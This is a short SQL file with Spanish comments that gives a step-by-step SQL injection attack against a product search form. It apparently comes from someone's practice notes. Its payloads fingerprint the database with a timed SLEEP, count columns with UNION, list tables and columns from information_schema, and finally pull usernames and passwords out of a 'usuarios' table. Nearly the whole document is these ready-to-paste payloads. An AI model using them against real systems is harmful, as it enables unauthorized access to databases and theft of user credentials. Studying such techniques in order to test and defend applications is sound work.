-- las queries se deben copiar en el input del form empezando por lo que viene despues del primer % hasta el 2do % (sin incluirlo)
-- ej: rojo' AND 1 = SLEEP(2); -- 
-- INCLUIR SI O SI un espacio despues de los -- 

-- verifico que marca de DB se usa (SLEEP existe en MySQL)
-- pero en SQL Server es WAITFOR DELAY '00:00:01'
-- y en Oracle es DBMS_LOCK.Sleep( 60 );
SELECT * FROM articulos WHERE nombre LIKE '%rojo' AND 1 = SLEEP(2); -- %' ;

-- verifico cuantas columnas se estan seleccionando realmente agregando o sacando numeros hasta que no salte error
SELECT ?,? FROM ? WHERE ? LIKE '%rojo' UNION (SELECT 1, 2, 3, 4 FROM information_schema.tables); -- %' ;


-- aca trato de apendiar los nombre de las bases de datos y sus tablas 
-- pero veo que hay 1 primera columna presente en el SELECT de productos pero que no se muestra (la ID probablemente)
SELECT ?,? FROM ? WHERE ? LIKE '%rojo' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3, 4 FROM information_schema.tables); -- %' ;

-- entonces reordeno las columnas de forma tal que las 2 columnas que quiero sean las que me renderea la pagina
SELECT ?,? FROM ? WHERE ? LIKE '%rojo' UNION (SELECT 1, TABLE_NAME, TABLE_SCHEMA, 4 FROM information_schema.tables); -- %' ;

-- con esto averiguamos el nombre de las columnas en la tabla que nos interesa mas que los articulos (Ej: usuarios). 
-- El nombre de esa tabla salio de la query anterior
SELECT ?,? FROM ? WHERE ? LIKE '%rojo' UNION (SELECT 1, COLUMN_NAME, 2, 3 FROM information_schema.columns WHERE TABLE_NAME = 'usuarios'); -- %' ;

-- hacemos un select de los campos que nos interesa de la tabla usuarios
SELECT ?,? FROM ? WHERE ? LIKE '%rojo' UNION (SELECT 1, username, password, 4 FROM usuarios); -- %' ;
